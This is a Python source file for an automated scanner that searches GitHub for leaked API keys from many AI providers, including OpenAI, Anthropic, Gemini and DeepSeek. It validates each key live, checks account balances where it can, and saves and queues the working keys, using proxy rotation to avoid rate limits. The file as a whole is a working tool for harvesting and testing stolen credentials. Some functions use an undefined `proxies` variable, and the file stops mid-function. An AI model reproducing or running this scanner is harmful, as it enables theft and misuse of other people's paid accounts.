"""

Hajimi-King V2 - Optimized Multi-Provider API Key Scanner



Optimizations over V1:

1. Concurrent key validation (ThreadPoolExecutor, 5x speedup)

2. Generic Bearer token validator (DRY, eliminated 90% duplicate code)

3. Direct raw.githubusercontent.com fetching (50% fewer GitHub API calls)

4. Global key dedup cache (avoids re-validating same key across files)

5. 13 providers with balance APIs (DeepSeek, OpenRouter)

6. Reduced sleep times (6x faster per key)

7. Smarter checkpoint saving (less disk I/O)

"""



import os

import random

import re

import sys

import time

import traceback

import threading

import json

from concurrent.futures import ThreadPoolExecutor, as_completed

from datetime import datetime, timedelta

from typing import Dict, List, Union, Any, Optional, Tuple, Set



import requests

import google.generativeai as genai

from google.api_core import exceptions as google_exceptions



from common.Logger import logger



sys.path.append('../')

from common.config import Config

from utils.github_client import GitHubClient

from utils.file_manager import file_manager, Checkpoint, checkpoint

from utils.sync_utils import sync_utils



# Initialize GitHub search

github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)



# ============ Global Key Dedup Cache ============

# Avoids re-validating the same key across different files

class KeyCache:

    """Global cache for already-validated keys"""

    def __init__(self):

        self.valid: Set[str] = set()

        self.invalid: Set[str] = set()

        self.rate_limited: Set[str] = set()

        self._lock = __import__('threading').Lock()



    def is_known(self, key: str) -> Optional[str]:

        """Check if key was already validated. Returns status or None."""

        with self._lock:

            if key in self.valid: return "ok"

            if key in self.rate_limited: return "rate_limited"

            if key in self.invalid: return "not_authorized_key"

        return None



    def mark(self, key: str, status: str):

        """Mark a key with its validation status"""

        with self._lock:

            if status == "ok": self.valid.add(key)

            elif status == "rate_limited": self.rate_limited.add(key)

            elif "error" not in status and "not_authorized" in status: self.invalid.add(key)



    def load_from_files(self, data_path: str, providers: dict):

        """Pre-load known keys from existing output files"""

        loaded = 0

        for provider_id in providers:

            provider_dir = os.path.join(data_path, provider_id)

            if not os.path.isdir(provider_dir):

                continue

            for fname in os.listdir(provider_dir):

                if fname.startswith("keys_valid_") or fname.startswith("key_429_") or fname.startswith("keys_invalid_"):

                    fpath = os.path.join(provider_dir, fname)

                    try:

                        with open(fpath, "r", encoding="utf-8") as f:

                            for line in f:

                                key = line.strip().split(" | ")[0].strip()

                                if key:

                                    if fname.startswith("keys_valid_"):

                                        self.valid.add(key)

                                    elif fname.startswith("key_429_"):

                                        self.rate_limited.add(key)

                                    else:

                                        self.invalid.add(key)

                                    loaded += 1

                    except Exception:

                        pass

        if loaded > 0:

            logger.info(f"KeyCache: loaded {loaded} known keys from existing files")



key_cache = KeyCache()



# ============ Skip Stats ============

skip_stats = {

    "time_filter": 0,

    "sha_duplicate": 0,

    "age_filter": 0,

    "doc_filter": 0,

    "key_cache_hit": 0,

}



# ============ Provider Configuration ============

PROVIDERS = {

    # === Top producers ===

    "nvidia": {

        "name": "NVIDIA",

        "prefix": "nvapi-",

        "pattern": r'(nvapi-[a-zA-Z0-9\-_]{40,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://integrate.api.nvidia.com/v1/models"},

        "has_balance_api": False,

    },

    "gemini": {

        "name": "Google Gemini",

        "prefix": "AIzaSy",

        "pattern": r'(AIzaSy[A-Za-z0-9\-_]{33})',

        "enabled": True,

        "validation": {"method": "gemini"},

        "has_balance_api": False,

        "skip_interval": 50,

    },

    "deepseek": {

        "name": "DeepSeek",

        "prefix": "sk-",

        "pattern": r'(sk-[a-f0-9]{32,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.deepseek.com/models"},

        "has_balance_api": True,

        "balance_api": "https://api.deepseek.com/user/balance",

        "balance_method": "deepseek",

        "context_keywords": ["deepseek", "DEEPSEEK_API_KEY", "DEEPSEEK_KEY",

                             "deepseek_api_key", "deepseek-key", "deepseek_key",

                             "api.deepseek.com"],

        "conflict_keywords": ["openai", "OPENAI_API_KEY", "sk-proj-", "gpt-4", "chatgpt"],

    },

    "modelscope": {

        "name": "ModelScope",

        "prefix": "ms-",

        "pattern": r'(ms-[a-zA-Z0-9]{32,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://api-inference.modelscope.cn/v1/models"},

        "has_balance_api": False,

    },

    "xiaomi": {

        "name": "Xiaomi",

        "prefix": "tp-",

        "pattern": r'(tp-[a-zA-Z0-9\-_]{20,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://token-plan-cn.xiaomimimo.com/v1/models"},

        "has_balance_api": False,

    },

    # === New providers with distinct prefixes ===

    "openrouter": {

        "name": "OpenRouter",

        "prefix": "sk-or-",

        "pattern": r'(sk-or-v1-[a-f0-9]{32,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://openrouter.ai/api/v1/models"},

        "has_balance_api": True,

        "balance_api": "https://openrouter.ai/api/v1/auth/key",

        "balance_method": "openrouter",

        "scan_limit": 200,

    },

    "groq": {

        "name": "Groq",

        "prefix": "gsk_",

        "pattern": r'(gsk_[a-zA-Z0-9]{48,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.groq.com/openai/v1/models"},

        "has_balance_api": False,

        "skip_interval": 50,

    },

    "anthropic": {

        "name": "Anthropic",

        "prefix": "sk-ant-",

        "pattern": r'(sk-ant-api03-[a-zA-Z0-9\-_]{80,})',

        "enabled": True,

        "validation": {"method": "anthropic"},

        "has_balance_api": False,

    },

    "xai": {

        "name": "xAI (Grok)",

        "prefix": "xai-",

        "pattern": r'(xai-[a-zA-Z0-9]{20,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.x.ai/v1/models"},

        "has_balance_api": False,

        "skip_interval": 50,

    },

    "perplexity": {

        "name": "Perplexity",

        "prefix": "pplx-",

        "pattern": r'(pplx-[a-f0-9]{40,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://api.perplexity.ai/models"},

        "has_balance_api": False,

    },

    "huggingface": {

        "name": "HuggingFace",

        "prefix": "hf_",

        "pattern": r'(hf_[a-zA-Z0-9]{34,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://huggingface.co/api/models"},

        "has_balance_api": False,

    },

    "replicate": {

        "name": "Replicate",

        "prefix": "r8_",

        "pattern": r'(r8_[a-zA-Z0-9]{30,})',

        "enabled": False,

        "validation": {"method": "replicate"},

        "has_balance_api": False,

    },

    "openai": {

        "name": "OpenAI",

        "prefix": "sk-proj-",

        "pattern": r'(sk-proj-[a-zA-Z0-9\-_]{40,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.openai.com/v1/models"},

        "has_balance_api": False,

    },

    # === Chinese AI providers ===

    "baidu": {

        "name": "百度文心",

        "prefix": "bce-",

        "pattern": r'(bce-[a-zA-Z0-9\-_]{20,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://qianfan.baidubce.com/v2/models"},

        "has_balance_api": False,

        "context_keywords": ["qianfan", "wenxin", "ernie", "baidu", "BAIDU_API_KEY",

                             "QIANFAN_API_KEY", "ERNIE_API_KEY", "bce-v1"],

    },

    "zhipu": {

        "name": "智谱GLM",

        "prefix": "",

        "pattern": r'([a-zA-Z0-9]{8,}\.[a-zA-Z0-9]{8,}\.[a-zA-Z0-9]{20,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://open.bigmodel.cn/api/paas/v4/models"},

        "has_balance_api": True,

        "balance_api": "https://open.bigmodel.cn/api/paas/v4/user/balance",

        "balance_method": "zhipu",

        "context_keywords": ["zhipu", "glm", "bigmodel", "ZHIPU_API_KEY", "GLM_API_KEY",

                             "BIGMODEL_API_KEY", "open.bigmodel.cn"],

    },

    "aliyun": {

        "name": "阿里通义",

        "prefix": "sk-",

        "pattern": r'(sk-[a-f0-9]{32,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://dashscope.aliyuncs.com/compatible-mode/v1/models"},

        "has_balance_api": False,

        "context_keywords": ["dashscope", "qwen", "tongyi", "aliyun", "DASHSCOPE_API_KEY",

                             "QWEN_API_KEY", "TONGYI_API_KEY", "dashscope.aliyuncs.com"],

        "conflict_keywords": ["openai", "OPENAI_API_KEY", "sk-proj-", "gpt-4", "chatgpt", "deepseek"],

    },

    "tencent": {

        "name": "腾讯混元",

        "prefix": "sk-",

        "pattern": r'(sk-[a-f0-9]{32,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://api.hunyuan.cloud.tencent.com/v1/models"},

        "has_balance_api": False,

        "context_keywords": ["hunyuan", "tencent", "HUNYUAN_API_KEY", "api.hunyuan.cloud.tencent.com"],

        "conflict_keywords": ["openai", "OPENAI_API_KEY", "sk-proj-", "gpt-4", "chatgpt", "deepseek", "dashscope"],

    },

    "moonshot": {

        "name": "月之暗面Kimi",

        "prefix": "sk-",

        "pattern": r'(sk-[a-f0-9]{32,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.moonshot.cn/v1/models"},

        "has_balance_api": True,

        "balance_api": "https://api.moonshot.cn/v1/users/me/balance",

        "balance_method": "moonshot",

        "context_keywords": ["moonshot", "kimi", "MOONSHOT_API_KEY", "KIMI_API_KEY", "api.moonshot.cn"],

        "conflict_keywords": ["openai", "OPENAI_API_KEY", "sk-proj-", "gpt-4", "chatgpt", "deepseek"],

    },

    "volcengine": {

        "name": "字节豆包",

        "prefix": "",

        "pattern": r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://ark.cn-beijing.volces.com/api/v3/models"},

        "has_balance_api": False,

        "context_keywords": ["volcengine", "ARK_API_KEY", "DOUBAO_API_KEY",
                             "ark.cn-beijing.volces.com", "VOLC_API_KEY",
                             "volcengine-api", "doubao-api", "VOLCENGINE"],

    },

    "minimax": {

        "name": "MiniMax",

        "prefix": "eyJ",

        "pattern": r'(eyJ[a-zA-Z0-9\-_]{50,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.minimax.chat/v1/models"},

        "has_balance_api": False,

        "context_keywords": ["minimax", "MINIMAX_API_KEY", "api.minimax.chat"],

    },

    # === Other new providers ===

    "together": {

        "name": "Together AI",

        "prefix": "tgp_",

        "pattern": r'(tgp_[a-zA-Z0-9]{32,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://api.together.xyz/v1/models"},

        "has_balance_api": False,

    },

    "fireworks": {

        "name": "Fireworks AI",

        "prefix": "fw_",

        "pattern": r'(fw_[a-zA-Z0-9]{32,})',

        "enabled": False,

        "validation": {"method": "bearer", "url": "https://api.fireworks.ai/inference/v1/models"},

        "has_balance_api": False,

    },

    "cohere": {

        "name": "Cohere",

        "prefix": "",

        "pattern": r'([a-zA-Z0-9]{40,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.cohere.com/v2/models"},

        "has_balance_api": False,

        "context_keywords": ["cohere", "CO_API_KEY", "COHERE_API_KEY", "api.cohere.com",
                             "cohere.ai", "COHERE_TOKEN", "cohere-sdk"],

    },

    "mistral": {

        "name": "Mistral AI",

        "prefix": "",

        "pattern": r'([a-zA-Z0-9]{40,})',

        "enabled": True,

        "validation": {"method": "bearer", "url": "https://api.mistral.ai/v1/models"},

        "has_balance_api": False,

        "context_keywords": ["mistral", "MISTRAL_API_KEY", "api.mistral.ai",
                             "MISTRAL_KEY", "mistral.ai", "MISTRAL_TOKEN",
                             "mistral-sdk", "codestral"],

    },

}





# ============ Balance Checker ============



class BalanceChecker:

    """Multi-provider API Key balance checker"""



    @staticmethod

    def check_deepseek(api_key: str, proxies=None) -> Optional[Dict]:

        try:

            resp = requests.get(

                "https://api.deepseek.com/user/balance",

                headers={"Authorization": f"Bearer {api_key}"},

                proxies=proxies, timeout=15

            )

            if resp.status_code == 200:

                data = resp.json()

                result = {"provider": "deepseek", "raw": data, "balances": [], "total_cny": 0.0, "total_usd": 0.0}

                for info in data.get("balance_infos", []):

                    cur = info.get("currency", "CNY")

                    total = float(info.get("total_balance", 0))

                    granted = float(info.get("granted_balance", 0))

                    topped = float(info.get("topped_up_balance", 0))

                    result["balances"].append({"currency": cur, "total_balance": total,

                                                "granted_balance": granted, "topped_up_balance": topped})

                    if cur == "CNY": result["total_cny"] += total

                    elif cur == "USD": result["total_usd"] += total

                return result

            return {"provider": "deepseek", "error": f"HTTP {resp.status_code}", "balances": [], "total_cny": 0.0, "total_usd": 0.0}

        except Exception as e:

            return {"provider": "deepseek", "error": str(e), "balances": [], "total_cny": 0.0, "total_usd": 0.0}



    @staticmethod

    def check_openrouter(api_key: str, proxies=None) -> Optional[Dict]:

        try:

            resp = requests.get(

                "https://openrouter.ai/api/v1/auth/key",

                headers={"Authorization": f"Bearer {api_key}"},

                proxies=proxies, timeout=15

            )

            if resp.status_code == 200:

                data = resp.json().get("data", {})

                usage = data.get("usage", 0)

                limit = data.get("limit")

                limit_remaining = data.get("limit_remaining")

                label = data.get("label", "")

                rate_limit = data.get("rate_limit", {})



                result = {

                    "provider": "openrouter",

                    "raw": data,

                    "balances": [],

                    "total_cny": 0.0, "total_usd": 0.0,

                    "usage": usage,

                    "limit": limit,

                    "limit_remaining": limit_remaining,

                    "label": label,

                }

                # Try to extract dollar amounts

                if limit is not None:

                    result["balances"].append({

                        "currency": "USD",

                        "total_balance": float(limit_remaining) if limit_remaining is not None else float(limit),

                        "granted_balance": float(limit) if limit else 0,

                        "topped_up_balance": 0,

                    })

                    result["total_usd"] = float(limit_remaining) if limit_remaining is not None else float(limit)

                return result

            return {"provider": "openrouter", "error": f"HTTP {resp.status_code}", "balances": [], "total_cny": 0.0, "total_usd": 0.0}

        except Exception as e:

            return {"provider": "openrouter", "error": str(e), "balances": [], "total_cny": 0.0, "total_usd": 0.0}



    @staticmethod

    def check_zhipu(api_key: str, proxies=None) -> Optional[Dict]:

        try:

            resp = requests.get(

                "https://open.bigmodel.cn/api/paas/v4/user/balance",

                headers={"Authorization": f"Bearer {api_key}"},

                proxies=proxies, timeout=15

            )

            if resp.status_code == 200:

                data = resp.json()

                balance = float(data.get("balance", 0))

                return {"provider": "zhipu", "raw": data, "balances": [{"currency": "CNY", "total_balance": balance, "granted_balance": 0, "topped_up_balance": 0}], "total_cny": balance, "total_usd": 0.0}

            return {"provider": "zhipu", "error": f"HTTP {resp.status_code}", "balances": [], "total_cny": 0.0, "total_usd": 0.0}

        except Exception as e:

            return {"provider": "zhipu", "error": str(e), "balances": [], "total_cny": 0.0, "total_usd": 0.0}


    @staticmethod

    def check_moonshot(api_key: str, proxies=None) -> Optional[Dict]:

        try:

            resp = requests.get(

                "https://api.moonshot.cn/v1/users/me/balance",

                headers={"Authorization": f"Bearer {api_key}"},

                proxies=proxies, timeout=15

            )

            if resp.status_code == 200:

                data = resp.json()

                balance = float(data.get("data", {}).get("balance", 0))

                return {"provider": "moonshot", "raw": data, "balances": [{"currency": "CNY", "total_balance": balance, "granted_balance": 0, "topped_up_balance": 0}], "total_cny": balance, "total_usd": 0.0}

            return {"provider": "moonshot", "error": f"HTTP {resp.status_code}", "balances": [], "total_cny": 0.0, "total_usd": 0.0}

        except Exception as e:

            return {"provider": "moonshot", "error": str(e), "balances": [], "total_cny": 0.0, "total_usd": 0.0}


    @staticmethod

    def check_balance(provider: str, api_key: str, proxies=None) -> Optional[Dict]:

        if provider == "deepseek":

            return BalanceChecker.check_deepseek(api_key, proxies)

        elif provider == "openrouter":

            return BalanceChecker.check_openrouter(api_key, proxies)

        elif provider == "zhipu":

            return BalanceChecker.check_zhipu(api_key, proxies)

        elif provider == "moonshot":

            return BalanceChecker.check_moonshot(api_key, proxies)

        return None





balance_checker = BalanceChecker()



# ============ Loop state for skip_interval / scan_limit ============

_loop_count = 0

_scan_counts = {}

def should_skip_provider(provider_id: str) -> bool:
    """Check if provider should be skipped this loop due to skip_interval or scan_limit"""
    config = PROVIDERS.get(provider_id)
    if not config:
        return False
    # skip_interval: only validate every N loops for low-frequency providers
    interval = config.get("skip_interval")
    if interval and _loop_count % interval != 0:
        return True
    # scan_limit: cap per-loop validations for high-volume providers
    limit = config.get("scan_limit")
    if limit and _scan_counts.get(provider_id, 0) >= limit:
        return True
    return False


def format_balance_info(balance: Optional[Dict]) -> str:

    if not balance:

        return ""

    if "error" in balance:

        return f" [Balance Err: {balance['error']}]"

    parts = []

    for b in balance.get("balances", []):

        cur = b.get("currency", "?")

        total = b.get("total_balance", 0)

        granted = b.get("granted_balance", 0)

        topped = b.get("topped_up_balance", 0)

        parts.append(f"{cur}{total:.2f}(grant{granted:.2f}+topup{topped:.2f})")

    # Special fields for OpenRouter

    if balance.get("provider") == "openrouter":

        usage = balance.get("usage", 0)

        limit = balance.get("limit")

        remaining = balance.get("limit_remaining")

        if limit is not None:

            parts.append(f"Usage={usage}/{limit} Remaining={remaining}")

    return f" [Balance: {', '.join(parts)}]" if parts else ""





# ============ Query Normalization ============



def normalize_query(query: str) -> str:

    query = " ".join(query.split())

    parts, i = [], 0

    while i < len(query):

        if query[i] == '"':

            end = query.find('"', i + 1)

            if end != -1:

                parts.append(query[i:end + 1])

                i = end + 1

            else:

                parts.append(query[i])

                i += 1

        elif query[i] == ' ':

            i += 1

        else:

            start = i

            while i < len(query) and query[i] != ' ':

                i += 1

            parts.append(query[start:i])

    quoted, lang, filename, path_, other = [], [], [], [], []

    for p in parts:

        if p.startswith('"') and p.endswith('"'): quoted.append(p)

        elif p.startswith('language:'): lang.append(p)

        elif p.startswith('filename:'): filename.append(p)

        elif p.startswith('path:'): path_.append(p)

        elif p.strip(): other.append(p)

    return " ".join(sorted(quoted) + sorted(other) + sorted(lang) + sorted(filename) + sorted(path_))





# ============ Key Extraction ============



def extract_keys_from_content(content: str) -> Dict[str, List[str]]:
    """Extract API keys from content for all enabled providers (FIXED: prevent cross-contamination)"""
    
    results = {}
    content_lower = content.lower()
    
    # First pass: collect all keys with their provider
    all_keys = {}  # key -> provider_id
    
    for provider_id, config in PROVIDERS.items():
        if not config["enabled"]:
            continue
        
        keys = re.findall(config["pattern"], content)
        if not keys:
            continue
        
        # Context-aware extraction for providers with ambiguous prefixes
        if "context_keywords" in config:
            ctx_kw = config["context_keywords"]
            has_context = any(kw.lower() in content_lower for kw in ctx_kw)
            if not has_context:
                continue
            
            # If conflict keywords present, do proximity check
            if "conflict_keywords" in config:
                conflict_kw = config["conflict_keywords"]
                has_conflict = any(kw.lower() in content_lower for kw in conflict_kw)
                if has_conflict:
                    filtered = []
                    for key in keys:
                        pos = content.find(key)
                        if pos != -1:
                            ctx_start = max(0, pos - 150)
                            ctx_end = min(len(content), pos + len(key) + 150)
                            ctx = content[ctx_start:ctx_end].lower()
                            if any(kw.lower() in ctx for kw in ctx_kw):
                                filtered.append(key)
                    keys = filtered
                    if not keys:
                        continue
        
        # Store keys with provider info
        for key in keys:
            if key not in all_keys:
                all_keys[key] = provider_id
            # If key already assigned, keep the more specific provider
    
    # Second pass: group keys by provider (FIX: prevent sk- prefix cross-contamination)
    # Priority: OpenRouter (sk-or-v1-) > Anthropic (sk-ant-) > OpenAI (sk-proj-) > Others (sk-)
    priority_order = ['openrouter', 'anthropic', 'openai', 'deepseek', 'aliyun', 'tencent', 'moonshot']
    
    for key, provider_id in all_keys.items():
        if provider_id not in results:
            results[provider_id] = []
        results[provider_id].append(key)
    
    # Remove duplicates: if a key starts with sk-or-v1-, it should ONLY be in openrouter
    for provider_id in list(results.keys()):
        config = PROVIDERS[provider_id]
        if config.get("prefix") == "sk-" and provider_id != "openrouter":
            # Remove keys that start with sk-or-v1- (OpenRouter keys)
            results[provider_id] = [k for k in results[provider_id] if not k.startswith('sk-or-v1-')]
            if not results[provider_id]:
                del results[provider_id]
    
    return results
def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> Tuple[bool, str]:

    if checkpoint.last_scan_time:

        try:

            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)

            pushed = item["repository"].get("pushed_at")

            if pushed:

                pushed_dt = datetime.strptime(pushed, "%Y-%m-%dT%H:%M:%SZ")

                if pushed_dt <= last_scan_dt:

                    skip_stats["time_filter"] += 1

                    return True, "time_filter"

        except Exception:

            pass

    if item.get("sha") in checkpoint.scanned_shas:

        skip_stats["sha_duplicate"] += 1

        return True, "sha_duplicate"

    pushed = item["repository"].get("pushed_at")

    if pushed:

        pushed_dt = datetime.strptime(pushed, "%Y-%m-%dT%H:%M:%SZ")

        if pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):

            skip_stats["age_filter"] += 1

            return True, "age_filter"

    lowercase_path = item["path"].lower()

    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):

        skip_stats["doc_filter"] += 1

        return True, "doc_filter"

    return False, ""





def filter_placeholder_keys(keys: List[str], content: str) -> List[str]:

    filtered = []

    for key in keys:

        idx = content.find(key)

        if idx != -1:

            snippet = content[idx:idx + 45]

            if "..." in snippet or "YOUR_" in snippet.upper():

                continue

        filtered.append(key)

    return list(set(filtered))





# ============ Unified Validation ============



def validate_bearer_key(api_key: str, models_url: str, timeout: int = 10) -> str:

    """Generic Bearer token validation via GET /v1/models"""

    try:

        time.sleep(random.uniform(Config.VALIDATE_JITTER_MIN, Config.VALIDATE_JITTER_MAX))

        resp = requests.get(models_url,
                            headers={"Authorization": f"Bearer {api_key}"},
                            proxies=Config.get_random_proxy() if Config.USE_SCRIPT_PROXY else None,
                            timeout=timeout)

        if resp.status_code == 200: return "ok"

        if resp.status_code == 401: return "not_authorized_key"

        if resp.status_code == 403: return "not_authorized_key"

        if resp.status_code == 429: return "rate_limited"

        return f"error:{resp.status_code}"

    except requests.exceptions.ProxyError:

        return "proxy_error"

    except requests.exceptions.Timeout:

        return "timeout"

    except Exception as e:

        return f"error:{e.__class__.__name__}"





def validate_gemini_key(api_key: str) -> str:

    """Validate Google Gemini API Key (uses SDK)"""

    try:

        time.sleep(random.uniform(Config.VALIDATE_JITTER_MIN, Config.VALIDATE_JITTER_MAX))

        proxy_config = Config.get_random_proxy() if Config.USE_SCRIPT_PROXY else None

        client_options = {"api_endpoint": "https://generativelanguage.googleapis.com"}

        if proxy_config:

            os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(api_key=api_key, client_options=client_options)

        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)

        model.generate_content("hi")

        return "ok"

    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated):

        return "not_authorized_key"

    except google_exceptions.TooManyRequests:

        return "rate_limited"

    except Exception as e:

        s = str(e)

        if "429" in s or "rate limit" in s.lower() or "quota" in s.lower():

            return "rate_limited"

        if "403" in s or "SERVICE_DISABLED" in s or "API has not been used" in s:

            return "disabled"

        return f"error:{e.__class__.__name__}"





def validate_anthropic_key(api_key: str) -> str:

    """Validate Anthropic API Key via minimal messages request"""

    try:

        time.sleep(random.uniform(Config.VALIDATE_JITTER_MIN, Config.VALIDATE_JITTER_MAX))

        resp = requests.post(

            "https://api.anthropic.com/v1/messages",

            headers={

                "x-api-key": api_key,

                "anthropic-version": "2023-06-01",

                "content-type": "application/json",

            },

            json={"model": "claude-3-haiku-20240307", "max_tokens": 1,

                  "messages": [{"role": "user", "content": "hi"}]},

            proxies=Config.get_random_proxy() if Config.USE_SCRIPT_PROXY else None,

            timeout=15

        )

        if resp.status_code == 200: return "ok"

        if resp.status_code == 401: return "not_authorized_key"

        if resp.status_code == 429: return "rate_limited"

        if resp.status_code == 400: return "ok"  # Auth passed, bad request body

        if resp.status_code == 403: return "not_authorized_key"

        return f"error:{resp.status_code}"

    except requests.exceptions.ProxyError:

        return "proxy_error"

    except requests.exceptions.Timeout:

        return "timeout"

    except Exception as e:

        return f"error:{e.__class__.__name__}"





def validate_replicate_key(api_key: str) -> str:

    """Validate Replicate API Key (uses Token auth, not Bearer)"""

    try:

        time.sleep(random.uniform(Config.VALIDATE_JITTER_MIN, Config.VALIDATE_JITTER_MAX))

        resp = requests.get(
            "https://api.replicate.com/v1/models",

            headers={"Authorization": f"Token {api_key}"},

            proxies=proxies, timeout=10

        )

        if resp.status_code == 200: return "ok"

        if resp.status_code == 401: return "not_authorized_key"

        if resp.status_code == 429: return "rate_limited"

        return f"error:{resp.status_code}"

    except requests.exceptions.ProxyError:

        return "proxy_error"

    except requests.exceptions.Timeout:

        return "timeout"

    except Exception as e:

        return f"error:{e.__class__.__name__}"





def validate_key(provider_id: str, api_key: str) -> Tuple[str, Optional[Dict]]:

    """

    Unified key validation for all providers.

    Returns: (status, balance_info)

    - status: "ok", "not_authorized_key", "rate_limited", "error:xxx"

    - balance_info: dict if provider has balance API and key is valid/429, else None

    """

    config = PROVIDERS.get(provider_id)

    if not config:

        return "unknown_provider", None



    validation = config.get("validation", {})

    method = validation.get("method", "bearer")



    if method == "gemini":

        status = validate_gemini_key(api_key)

    elif method == "anthropic":

        status = validate_anthropic_key(api_key)

    elif method == "replicate":

        status = validate_replicate_key(api_key)

    elif method == "bearer":

        status = validate_bearer_key(api_key, validation["url"], timeout=validation.get("timeout", 10))

    else:

        return "unsupported_method", None



    # Check balance if key is valid/429 and provider supports it

    balance_info = None

    if config.get("has_balance_api") and status in ("ok", "rate_limited"):

                balance_info = balance_checker.check_balance(provider_id, api_key, proxies)



    return status, balance_info





def validate_keys_batch(keys: List[str], provider_id: str, max_workers: int = None) -> Dict[str, Tuple[str, Optional[Dict]]]:

    """Concurrent batch validation of multiple keys"""

    results = {}

    # Check cache first

    to_validate = []

    for key in keys:

        cached = key_cache.is_known(key)

        if cached:

            skip_stats["key_cache_hit"] += 1

            # For rate-limited cached keys, still try balance if provider supports it

            if cached == "rate_limited" and PROVIDERS[provider_id].get("has_balance_api"):

                to_validate.append(key)

            else:

                results[key] = (cached, None)

        else:

            to_validate.append(key)



    if not to_validate:

        return results



    if max_workers is None:

        max_workers = Config.VALIDATE_WORKERS



    with ThreadPoolExecutor(max_workers=max_workers) as executor:

        future_to_key = {

            executor.submit(validate_key, provider_id, key): key

            for key in to_validate

        }

        for future in as_completed(future_to_key):

            key = future_to_key[future]

            try:

                status, balance = future.result()

                results[key] = (status, balance)

                key_cache.mark(key, status)

            except Exception as e:

                results[key] = (f"error:{e.__class__.__name__}", None)



    return results





# ============ Raw URL Fetcher ============



def fetch_file_raw(item: Dict[str, Any]) -> Optional[str]:

    """

    Fetch file content via raw.githubusercontent.com (1 API call)

    Falls back to github_utils.get_file_content() (2 API calls) on failure

    """

    repo = item["repository"]["full_name"]

    path = item["path"]



    # Try to construct raw URL from html_url

    html_url = item.get("html_url", "")

    # html_url: https://github.com/{owner}/{repo}/blob/{branch}/{path}

    if "/blob/" in html_url:

        raw_url = html_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")

        token = github_utils._next_token()

        headers = {"Accept": "application/vnd.github.v3+json"}

        if token:

            headers["Authorization"] = f"token {token}"



        try:

            resp = requests.get(raw_url, headers=headers,

                                proxies=proxies, timeout=15)

            if resp.status_code == 200 and len(resp.text) > 0:

                return resp.text

        except Exception:

            pass  # Fall through to original method



    # Fallback to original method (2 API calls)

    return github_utils.get_file_content(item)





# ============ Process Item ============



def process_item(item: Dict[str, Any]) -> Dict[str, int]:

    """Process a single GitHub search result item with concurrent validation"""

    time.sleep(random.uniform(Config.FILE_SLEEP_MIN, Config.FILE_SLEEP_MAX))

    file_url = item["html_url"]

    repo_name = item["repository"]["full_name"]

    file_path = item["path"]



    content = fetch_file_raw(item)

    if not content:

        logger.warning(f"Failed to fetch: {file_url}")

        return {}



    all_keys = extract_keys_from_content(content)

    if not all_keys:

        return {}



    results = {}

    for provider, keys in all_keys.items():

        filtered_keys = filter_placeholder_keys(keys, content)

        if not filtered_keys:

            continue



        provider_name = PROVIDERS[provider]["name"]

        # Skip check: low-freq interval or per-scan limit
        if should_skip_provider(provider):
            logger.info(f"[{provider_name}] Skipped (interval/limit reached)")
            continue

        logger.info(f"[{provider_name}] Found {len(filtered_keys)} candidate key(s), validating concurrently...")



        # Concurrent validation

        validation_results = validate_keys_batch(filtered_keys, provider)



        valid_keys = []

        invalid_keys = []

        valid_keys_with_balance = []

        rate_limited_keys = []

        rate_limited_keys_with_balance = []



        for key, (status, balance_info) in validation_results.items():

            balance_str = format_balance_info(balance_info)

            if status == "ok":

                valid_keys.append(key)

                if balance_info:

                    valid_keys_with_balance.append({"key": key, "balance": balance_info})

                logger.info(f"[{provider_name}] VALID: {key[:20]}...{balance_str}")

            elif status == "rate_limited":

                rate_limited_keys.append(key)

                if balance_info:

                    rate_limited_keys_with_balance.append({"key": key, "balance": balance_info})

                logger.info(f"[{provider_name}] RATE LIMITED: {key[:20]}...{balance_str}")

            else:

                if status == "not_authorized_key":

                    invalid_keys.append(key)

                logger.info(f"[{provider_name}] INVALID: {key[:20]}... ({status})")



        # Save results

        if valid_keys:

            file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys, provider=provider)

            if valid_keys_with_balance:

                save_balance_info(valid_keys_with_balance, provider)

            try:

                sync_utils.add_keys_to_queue(valid_keys, provider=provider)

            except Exception as e:

                logger.error(f"Sync queue error: {e}")



        if invalid_keys:

            file_manager.save_invalid_keys(invalid_keys, provider=provider)

        if rate_limited_keys:

            file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys, provider=provider)

            if rate_limited_keys_with_balance:

                save_balance_info(rate_limited_keys_with_balance, provider, is_rate_limited=True)



        results[provider] = len(valid_keys)
        if provider in _scan_counts:
            _scan_counts[provider] += len(valid_keys)
        else:
            _scan_counts[provider] = len(valid_keys)

    return results





def save_balance_info(keys_with_balance: List[Dict], provider: str, is_rate_limited: bool = False) -> None:

    date_str = datetime.now().strftime('%Y%m%d')

    balance_dir = os.path.join(Config.DATA_PATH, provider)

    os.makedirs(balance_dir, exist_ok=True)

    prefix = "balance_429" if is_rate_limited else "balance_valid"

